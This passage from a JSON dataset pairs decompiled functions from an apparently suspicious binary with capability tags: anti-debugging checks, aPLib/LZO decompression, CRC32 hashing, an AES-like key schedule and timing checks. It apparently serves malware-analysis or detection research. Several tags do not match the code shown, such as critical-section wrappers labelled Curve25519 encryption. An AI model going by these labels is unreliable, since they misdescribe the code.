fcn.004099f0();\n    return uVar6;\n}\n",
        "token_count": 622
    },
    "0040f82d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040f82d(int32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint arg_8h_00;\n    uint lpParameter;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    cVar1 = fcn.00411d41();\n    iVar3 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    if (iVar3 != 0) {\n        if (arg_8h != 0) {\n            (*_sym.imp.KERNEL32.dll_OutputDebugStringW)(arg_8h);\n        }\n        if (cVar1 != '\\0') {\n            return 4;\n        }\n    }\n    cVar2 = fcn.00411bdd();\n    if (cVar2 == '\\0') {\n        iVar3 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n        iVar3 = (iVar3 != 0) + 3;\n    }\n    else if (cVar1 == '\\0') {\n        cVar1 = fcn.00411c9b();\n        if (cVar1 == '\\0') {\n            arg_10h = arg_10h | 0x200000;\n            arg_8h_00 = 0;\n        }\n        else {\n            arg_8h_00 = fcn.00411bf6();\n        }\n        iVar3 = fcn.00411b3d(arg_8h_00, arg_8h, arg_ch, arg_10h);\n    }\n    else {\n        iVar3 = 0;\n        lpParameter = arg_ch;\n        var_8h = arg_10h;\n        var_ch = arg_8h;\n        var_4h = 0;\n        iVar4 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040f80b, &lpParameter, 0, 0);\n        if (iVar4 != -1) {\n            iVar5 = (*_sym.imp.KERNEL32.dll_WaitForSingleObjectEx)(iVar4, 0xffffffff, 0);\n            if (iVar5 == 0) {\n                iVar3 = var_4h;\n            }\n            if (iVar4 != -1) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n            }\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 560
    },
    "00416eeb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00416eeb(char *arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    uint uVar6;\n    \n    if (arg_14h == 0) {\n        if (arg_8h == NULL) {\n            if (arg_ch == 0) {\n                return 0;\n            }\n        }\n        else {\ncode_r0x00416e5c:\n            if (arg_ch != 0) {\n                if (arg_14h == 0) {\n                    *arg_8h = '\\0';\n                    return 0;\n                }\n                if (arg_10h != 0) {\n                    iVar3 = arg_14h;\n                    iVar4 = arg_ch;\n                    pcVar5 = arg_8h;\n                    if (arg_14h == -1) {\n                        do {\n                            cVar1 = pcVar5[arg_10h - arg_8h];\n                            *pcVar5 = cVar1;\n                            pcVar5 = pcVar5 + 1;\n                            if (cVar1 == '\\0') break;\n                            iVar4 = iVar4 + -1;\n                        } while (iVar4 != 0);\n                    }\n                    else {\n                        do {\n                            cVar1 = pcVar5[arg_10h - arg_8h];\n                            *pcVar5 = cVar1;\n                            pcVar5 = pcVar5 + 1;\n                            if ((cVar1 == '\\0') || (iVar4 = iVar4 + -1,  iVar4 == 0)) break;\n                            iVar3 = iVar3 + -1;\n                        } while (iVar3 != 0);\n                        if (iVar3 == 0) {\n                            *pcVar5 = '\\0';\n                        }\n                    }\n                    if (iVar4 != 0) {\n                        return 0;\n                    }\n                    if (arg_14h == -1) {\n                        arg_8h[arg_ch + -1] = '\\0';\n                        return 0x50;\n                    }\n                    *arg_8h = '\\0';\n                    puVar2 = fcn.0040f5be();\n                    uVar6 = 0x22;\n                    goto code_r0x00416e7c;\n                }\n                *arg_8h = '\\0';\n            }\n        }\n    }\n    else if (arg_8h != NULL) goto code_r0x00416e5c;\n    puVar2 = fcn.0040f5be();\n    uVar6 = 0x16;\ncode_r0x00416e7c:\n    *puVar2 = uVar6;\n    fcn.004099f0();\n    return uVar6;\n}\n",
        "token_count": 621
    },
    "00401b00": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00401b00(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    int32_t arg_ch;\n    uint *puVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    uint var_668h;\n    uint var_340h;\n    int32_t var_18h;\n    char *var_14h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint *var_4h;\n    \n    pcVar2 = fcn.00406657(*(param_2 + 0x10));\n    var_14h = pcVar2;\n    var_18h = fcn.00401090();\n    cVar1 = *pcVar2;\n    arg_ch = CONCAT31(CONCAT21(CONCAT11(cVar1, pcVar2[1]), pcVar2[2]), pcVar2[3]);\n    var_8h = fcn.00406657(arg_ch);\n    iVar3 = 0;\n    if (arg_ch != 0 && -1 < cVar1) {\n        do {\n            *(iVar3 + var_8h) = pcVar2[iVar3 + 4];\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_ch);\n    }\n    var_18h = var_18h - arg_ch;\n    uVar7 = var_18h - 4;\n    var_ch = fcn.00406657(uVar7);\n    uVar4 = 0;\n    pcVar5 = pcVar2;\n    if (uVar7 != 0) {\n        do {\n            *(uVar4 + var_ch) = pcVar2[uVar4 + arg_ch + 4];\n            uVar4 = uVar4 + 1;\n            pcVar5 = var_14h;\n        } while (uVar4 < uVar7);\n    }\n    fcn.004021f0(var_ch, var_18h + -4);\n    fcn.004021f0(var_8h, arg_ch);\n    puVar6 = var_4h;\n    for (iVar3 = 200; puVar6 = puVar6 + 1,  iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n    }\n    *var_4h = 1;\n    puVar6 = var_4h + 0xca;\n    for (iVar3 = 200; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_4h[0xc9] = 1;\n    puVar6 = &var_340h;\n    puVar8 = var_4h;\n    for (iVar3 = 0xc9; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar8 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    puVar6 = &var_668h;\n    puVar8 = var_4h + 0xc9;\n    for (iVar3 = 0xc9; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar8 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    fcn.00406652(pcVar5);\n    fcn.00406652(var_8h);\n    fcn.00406652(var_ch);\n    return var_4h;\n}\n",
        "token_count": 843
    },
    "00405e00": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n\nvoid __cdecl fcn.00405e00(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t *in_ECX;\n    uint unaff_EBX;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x424008 ^ &stack0xfffffffc;\n    var_2ch = 1;\n    var_28h = 2;\n    var_24h = 4;\n    *in_ECX = *arg_8h;\n    var_20h = 8;\n    var_1ch = 0x10;\n    var_18h = 0x20;\n    in_ECX[1] = arg_8h[1];\n    var_14h = 0x40;\n    var_10h = 0x80;\n    var_ch = 0x1b;\n    in_ECX[2] = arg_8h[2];\n    var_8h = 0x36;\n    in_ECX[3] = arg_8h[3];\n    in_ECX[4] = arg_8h[4];\n    in_ECX[5] = arg_8h[5];\n    uVar2 = 8;\n    in_ECX[6] = arg_8h[6];\n    in_ECX[7] = arg_8h[7];\n    puVar3 = in_ECX;\n    do {\n        uVar1 = puVar3[7];\n        if ((uVar2 & 7) == 0) {\n            uVar1 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar1 & 0xff], str.cw[uVar1 >> 0x18]), \n                                      str.cw[(uVar1 >> 8 & 0xff00) >> 8]), str.cw[uVar1 >> 8 & 0xff]) ^\n                    (&var_30h)[uVar2 >> 3];\n        }\n        else if ((uVar2 & 7) == 4) {\n            uVar1 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar1 >> 0x18], str.cw[uVar1 >> 0x10 & 0xff]), \n                                      str.cw[uVar1 >> 8 & 0xff]), str.cw[uVar1 & 0xff]);\n        }\n        uVar2 = uVar2 + 1;\n        puVar3[8] = *puVar3 ^ uVar1;\n        puVar3[0x44] = *puVar3 ^ uVar1;\n        puVar3 = puVar3 + 1;\n    } while (uVar2 < 0x3c);\n    uVar2 = 0x10;\n    in_ECX[0x3c] = *in_ECX;\n    in_ECX[0x3d] = in_ECX[1];\n    in_ECX[0x3e] = in_ECX[2];\n    in_ECX[0x3f] = in_ECX[3];\n    in_ECX[0x40] = in_ECX[4];\n    in_ECX[0x41] = in_ECX[5];\n    in_ECX[0x42] = in_ECX[6];\n    in_ECX[0x43] = in_ECX[7];\n    var_30h = unaff_EBX;\n    do {\n        fcn.004060b0(in_ECX + uVar2 + 0xf0);\n        uVar2 = uVar2 + 0x10;\n    } while (uVar2 < 0xe0);\n    fcn.0040640a(var_30h);\n    return;\n}\n",
        "token_count": 914
    },
    "004060b0": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004060b0(int32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 4;\n    puVar1 = arg_8h + 2;\n    do {\n        iVar2 = str.cw[puVar1[-2]] * 4;\n        uVar4 = str.cw[puVar1[1]];\n        iVar3 = str.cw[*puVar1] * 4;\n        uVar5 = str.cw[puVar1[-1]];\n        var_8h = var_8h + -1;\n        *(puVar1 + -2) =\n             ((*(uVar5 * 4 + 0x4214a1) ^ str.PAeS[uVar4 * 4] ^ *(iVar2 + 0x4214a2) ^ *(iVar3 + 0x4214a0) |\n              (*(uVar5 * 4 + 0x4214a2) ^ str.PAeS[iVar2] ^ *(iVar3 + 0x4214a1) ^ *(uVar4 * 4 + 0x4214a0)) << 8) << 8 |\n             *(uVar5 * 4 + 0x4214a0) ^ *(uVar4 * 4 + 0x4214a2) ^ *(iVar2 + 0x4214a1) ^ str.PAeS[iVar3]) << 8 |\n             str.PAeS[uVar5 * 4] ^ *(uVar4 * 4 + 0x4214a1) ^ *(iVar2 + 0x4214a0) ^ *(iVar3 + 0x4214a2);\n        puVar1 = puVar1 + 4;\n    } while (var_8h != 0);\n    return;\n}\n",
        "token_count": 455
    },
    "0041457d": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041457d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t lpCriticalSection;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00406b80(0x4231a0, 0x14);\n    lpCriticalSection = *(unaff_EBP + 8);\n    if (lpCriticalSection == 0xfffffffe) {\n        puVar1 = fcn.0040f5ab();\n        *puVar1 = 0;\n        puVar1 = fcn.0040f5be();\n        *puVar1 = 9;\n    }\n    else {\n        if ((-1 < lpCriticalSection) && (lpCriticalSection < *0x425050)) {\n            iVar3 = (lpCriticalSection & 0x3f) * 0x30;\n            *(unaff_EBP + -0x20) = iVar3;\n            if ((*(*((lpCriticalSection >> 6) * 4 + 0x424e50) + 0x28 + iVar3) & 1) != 0) {\n                fcn.00412ec5(lpCriticalSection);\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n                *(unaff_EBP + -4) = 0;\n                if ((*(*((lpCriticalSection >> 6) * 4 + 0x424e50) + 0x28 + *(unaff_EBP + -0x20)) & 1) == 0) {\n                    puVar1 = fcn.0040f5be();\n                    *puVar1 = 9;\n                    puVar1 = fcn.0040f5ab();\n                    *puVar1 = 0;\n                }\n                else {\n                    uVar2 = fcn.00414668(lpCriticalSection, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar2;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0041463f();\n                goto code_r0x00414662;\n            }\n        }\n        puVar1 = fcn.0040f5ab();\n        *puVar1 = 0;\n        puVar1 = fcn.0040f5be();\n        *puVar1 = 9;\n        fcn.004099f0();\n    }\ncode_r0x00414662:\n    fcn.00406bc6();\n    return;\n}\n",
        "token_count": 610
    },
    "0040c709": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040c709(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.0040c54b(8, 0);\n    return;\n}\n",
        "token_count": 93
    },
    "00413ebe": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00413ebe(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t arg_8h_00;\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    uint uVar4;\n    uint unaff_retaddr;\n    uint var_1ch;\n    uint var_4h;\n    uint noname_1;\n    \n    noname_1 = 0xc;\n    fcn.00406b80();\n    uVar4 = 0;\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.00412ec5(**(unaff_EBP + 8));\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = ***(unaff_EBP + 0xc);\n    if ((*(*((arg_8h_00 >> 6) * 4 + 0x424e50) + 0x28 + (arg_8h_00 & 0x3f) * 0x30) & 1) != 0) {\n        uVar1 = fcn.00412f9c(arg_8h_00);\n        iVar2 = (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(uVar1);\n        if (iVar2 != 0) goto code_r0x00413f2e;\n        puVar3 = fcn.0040f5ab();\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        *puVar3 = uVar4;\n    }\n    puVar3 = fcn.0040f5be();\n    *puVar3 = 9;\n    uVar4 = 0xffffffff;\ncode_r0x00413f2e:\n    *(unaff_EBP + -0x1c) = uVar4;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00413f4a(0x423180, noname_1, unaff_retaddr);\n    fcn.00406bc6();\n    return;\n}\n",
        "token_count": 486
    },
    "00416861": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00416861(uint32_t arg_8h, uint *arg_ch)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    arg_8h_00 = fcn.00411368(arg_ch);\n    if ((arg_ch[3] & 6) == 0) {\n        puVar2 = fcn.0040f5be();\n        *puVar2 = 9;\n    }\n    else {\n        if ((arg_ch[3] >> 0xc & 1) == 0) {\n            if ((arg_ch[3] & 1) != 0) {\n                arg_ch[2] = 0;\n                if ((arg_ch[3] >> 3 & 1) == 0) goto code_r0x004164c5;\n                *arg_ch = arg_ch[1];\n                LOCK();\n                arg_ch[3] = arg_ch[3] & 0xfffffffe;\n            }\n            LOCK();\n            arg_ch[3] = arg_ch[3] | 2;\n            LOCK();\n            arg_ch[3] = arg_ch[3] & 0xfffffff7;\n            arg_ch[2] = 0;\n            if (((arg_ch[3] & 0x4c0) == 0) &&\n               (((puVar2 = fcn.0040f900(1),  arg_ch != puVar2 && (puVar2 = fcn.0040f900(2),  arg_ch != puVar2)) ||\n                (iVar3 = fcn.00416877(arg_8h_00),  iVar3 == 0)))) {\n                fcn.0041782d(arg_ch);\n            }\n            cVar1 = fcn.004166c1(arg_8h, arg_ch);\n            if (cVar1 == '\\0') {\n                LOCK();\n                arg_ch[3] = arg_ch[3] | 0x10;\n                return 0xffffffff;\n            }\n            return arg_8h & 0xff;\n        }\n        puVar2 = fcn.0040f5be();\n        *puVar2 = 0x22;\n    }\ncode_r0x004164c5:\n    LOCK();\n    arg_ch[3] = arg_ch[3] | 0x10;\n    return 0xffffffff;\n}\n",
        "token_count": 524
    },
    "0041686c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0041686c(uint32_t arg_8h, uint *arg_ch)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    arg_8h_00 = fcn.00411368(arg_ch);\n    if ((arg_ch[3] & 6) == 0) {\n        puVar2 = fcn.0040f5be();\n        *puVar2 = 9;\n    }\n    else {\n        if ((arg_ch[3] >> 0xc & 1) == 0) {\n            if ((arg_ch[3] & 1) != 0) {\n                arg_ch[2] = 0;\n                if ((arg_ch[3] >> 3 & 1) == 0) goto code_r0x004165d6;\n                *arg_ch = arg_ch[1];\n                LOCK();\n                arg_ch[3] = arg_ch[3] & 0xfffffffe;\n            }\n            LOCK();\n            arg_ch[3] = arg_ch[3] | 2;\n            LOCK();\n            arg_ch[3] = arg_ch[3] & 0xfffffff7;\n            arg_ch[2] = 0;\n            if (((arg_ch[3] & 0x4c0) == 0) &&\n               (((puVar2 = fcn.0040f900(1),  arg_ch != puVar2 && (puVar2 = fcn.0040f900(2),  arg_ch != puVar2)) ||\n                (iVar3 = fcn.00416877(arg_8h_00),  iVar3 == 0)))) {\n                fcn.0041782d(arg_ch);\n            }\n            cVar1 = fcn.0041678d(arg_8h, arg_ch);\n            if (cVar1 == '\\0') {\n                LOCK();\n                arg_ch[3] = arg_ch[3] | 0x10;\n                return 0xffff;\n            }\n            return arg_8h & 0xffff;\n        }\n        puVar2 = fcn.0040f5be();\n        *puVar2 = 0x22;\n    }\ncode_r0x004165d6:\n    LOCK();\n    arg_ch[3] = arg_ch[3] | 0x10;\n    return 0xffff;\n}\n",
        "token_count": 525
    },
    "0041788a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041788a(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t arg_8h_00;\n    uint uVar1;\n    uint *puVar2;\n    int32_t unaff_EBP;\n    uint unaff_retaddr;\n    uint var_1ch;\n    uint var_4h;\n    uint noname_1;\n    \n    noname_1 = 0xc;\n    fcn.00406b80();\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.00412ec5(**(unaff_EBP + 8));\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = ***(unaff_EBP + 0xc);\n    if ((*(*((arg_8h_00 >> 6) * 4 + 0x424e50) + 0x28 + (arg_8h_00 & 0x3f) * 0x30) & 1) == 0) {\n        puVar2 = fcn.0040f5be();\n        *puVar2 = 9;\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = fcn.004179b3(arg_8h_00);\n    }\n    *(unaff_EBP + -0x1c) = uVar1;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00417900(0x423220, noname_1, unaff_retaddr);\n    fcn.00406bc6();\n    return;\n}\n",
        "token_count": 376
    },
    "00417934": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00417934(uint32_t arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint *var_4h;\n    \n    if (arg_8h == 0xfffffffe) {\n        puVar1 = fcn.0040f5ab();\n        *puVar1 = 0;\n        puVar1 = fcn.0040f5be();\n        *puVar1 = 9;\n    }\n    else {\n        if (((-1 < arg_8h) && (arg_8h < *0x425050)) &&\n           ((*(*((arg_8h >> 6) * 4 + 0x424e50) + 0x28 + (arg_8h & 0x3f) * 0x30) & 1) != 0)) {\n            var_4h = &arg_8h;\n            uVar2 = fcn.0041790c(arg_8h, &var_4h);\n            return uVar2;\n        }\n        puVar1 = fcn.0040f5ab();\n        *puVar1 = 0;\n        puVar1 = fcn.0040f5be();\n        *puVar1 = 9;\n        fcn.004099f0();\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 294
    },
    "00406bdb": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00406c1c)\n// WARNING: Removing unreachable block (ram,0x00406ccc)\n// WARNING: Removing unreachable block (ram,0x00406c56)\n\nuint fcn.00406bdb(void)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t in_XCR0;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x424be8 = 0;\n    *0x424010 = *0x424010 | 1;\n    iVar4 = sub.KERNEL32.dll_IsProcessorFeaturePresent(10);\n    uVar3 = *0x424010;\n    if (iVar4 != 0) {\n        var_10h = 0;\n        *0x424010 = *0x424010 | 2;\n        *0x424be8 = 1;\n        piVar1 = cpuid_basic_info(0);\n        puVar2 = cpuid_Version_info(1);\n        uVar6 = puVar2[3];\n        if (((piVar1[2] ^ 0x49656e69U | piVar1[3] ^ 0x6c65746eU | piVar1[1] ^ 0x756e6547U) == 0) &&\n           (((((uVar5 = *puVar2 & 0xfff3ff0,  uVar5 == 0x106c0 || (uVar5 == 0x20660)) || (uVar5 == 0x20670)) ||\n             ((uVar5 == 0x30650 || (uVar5 == 0x30660)))) || (uVar5 == 0x30670)))) {\n            *0x424bec = *0x424bec | 1;\n        }\n        if (6 < *piVar1) {\n            iVar4 = cpuid_Extended_Feature_Enumeration_info(7);\n            var_10h = *(iVar4 + 4);\n            if ((var_10h & 0x200) != 0) {\n                *0x424bec = *0x424bec | 2;\n            }\n        }\n        if ((uVar6 & 0x100000) != 0) {\n            *0x424010 = uVar3 | 6;\n            *0x424be8 = 2;\n            if ((((uVar6 & 0x8000000) != 0) && ((uVar6 & 0x10000000) != 0)) && ((in_XCR0 & 6) == 6)) {\n                *0x424010 = uVar3 | 0xe;\n                *0x424be8 = 3;\n                if ((var_10h & 0x20) != 0) {\n                    *0x424010 = uVar3 | 0x2e;\n                    *0x424be8 = 5;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 746
    },
    "0040fd27": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040fd27(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t unaff_EBP;\n    uint unaff_retaddr;\n    uint var_1ch;\n    uint var_4h;\n    uint noname_1;\n    \n    noname_1 = 0xc;\n    fcn.00406b80();\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.00411e3f(**(unaff_EBP + 8));\n    *(unaff_EBP + -4) = 0;\n    uVar1 = *0x424008 & 0x1f;\n    *(unaff_EBP + -0x1c) = (*0x424008 ^ *0x424e3c) >> uVar1 | (*0x424008 ^ *0x424e3c) << 0x20 - uVar1;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0040fd75(0x4230a0, noname_1, unaff_retaddr);\n    fcn.00406bc6();\n    return;\n}\n",
        "token_count": 278
    },
    "00412ec5": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412ec5(uint32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)\n              ((lpCriticalSection & 0x3f) * 0x30 + *((lpCriticalSection >> 6) * 4 + 0x424e50));\n    return;\n}\n",
        "token_count": 69
    },
    "00412ee8": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412ee8(uint32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)\n              ((lpCriticalSection & 0x3f) * 0x30 + *((lpCriticalSection >> 6) * 4 + 0x424e50));\n    return;\n}\n",
        "token_count": 70
    },
    "00401a40": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401aab)\n// WARNING: Removing unreachable block (ram,0x00401aa0)\n// WARNING: Removing unreachable block (ram,0x00401ab0)\n// WARNING: Removing unreachable block (ram,0x00401ab5)\n// WARNING: Removing unreachable block (ram,0x00401abc)\n// WARNING: Removing unreachable block (ram,0x00401ac1)\n// WARNING: Removing unreachable block (ram,0x00401ac8)\n// WARNING: Removing unreachable block (ram,0x00401acd)\n// WARNING: Removing unreachable block (ram,0x00401ad2)\n// WARNING: Removing unreachable block (ram,0x00401ad7)\n// WARNING: Removing unreachable block (ram,0x00401ad9)\n\nvoid fcn.00401a40(void)\n\n{\n    uint32_t arg_8h;\n    int32_t *in_FS_OFFSET;\n    uint var_28h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x41a3c8;\n    var_ch = *in_FS_OFFSET;\n    arg_8h = *0x424008 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.004014b0(0x420c04, 0);\n    var_4h = 0;\n    fcn.004063e6();\n    *in_FS_OFFSET = var_ch;\n    fcn.0040640a(arg_8h);\n    return;\n}\n",
        "token_count": 375
    },
    "004013a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004013a0(uint32_t **param_1)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    uint32_t *puVar3;\n    \n    if (param_1[5] < 0x10) goto code_r0x004013d8;\n    puVar1 = *param_1;\n    puVar3 = puVar1;\n    if (param_1[5] + 1U < 0x1000) {\ncode_r0x004013cf:\n        fcn.0040664d(puVar3);\ncode_r0x004013d8:\n        param_1[5] = 0xf;\n        param_1[4] = NULL;\n        if (0xf < param_1[5]) {\n            param_1 = *param_1;\n        }\n        *param_1 = 0;\n        return;\n    }\n    if ((puVar1 & 0x1f) == 0) {\n        puVar3 = puVar1[-1];\n        if (puVar1 <= puVar3) goto code_r0x004013f8;\n        if (3 < puVar1 - puVar3) {\n            if (0x23 < puVar1 - puVar3) goto code_r0x00401402;\n            goto code_r0x004013cf;\n        }\n    }\n    else {\n        fcn.00409a00();\ncode_r0x004013f8:\n        fcn.00409a00();\n    }\n    fcn.00409a00();\ncode_r0x00401402:\n    fcn.00409a00();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 382
    },
    "004015b0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004015b0(int32_t **arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t **in_ECX;\n    int32_t **ppiVar3;\n    \n    if (arg_8h[4] < arg_ch) {\n        fcn.004063b9(\"invalid string position\");\n    }\n    else {\n        piVar2 = arg_8h[4] - arg_ch;\n        if (piVar2 < arg_10h) {\n            arg_10h = piVar2;\n        }\n        if (in_ECX != arg_8h) {\n            if (arg_10h != 0xffffffff) {\n                if (in_ECX[5] < arg_10h) {\n                    fcn.00401750(arg_10h, in_ECX[4]);\n                    if (arg_10h == NULL) {\n                        return;\n                    }\n                }\n                else if (arg_10h == NULL) {\n                    in_ECX[4] = NULL;\n                    if (0xf < in_ECX[5]) {\n                        **in_ECX = 0;\n                        return;\n                    }\n                    *in_ECX = 0;\n                    return;\n                }\n                if (0xf < arg_8h[5]) {\n                    arg_8h = *arg_8h;\n                }\n                ppiVar3 = in_ECX;\n                if (0xf < in_ECX[5]) {\n                    ppiVar3 = *in_ECX;\n                }\n                if (arg_10h != NULL) {\n                    fcn.00419bb0(ppiVar3, arg_8h + arg_ch, arg_10h);\n                }\n                in_ECX[4] = arg_10h;\n                if (in_ECX[5] < 0x10) {\n                    *(in_ECX + arg_10h) = 0;\n                    return;\n                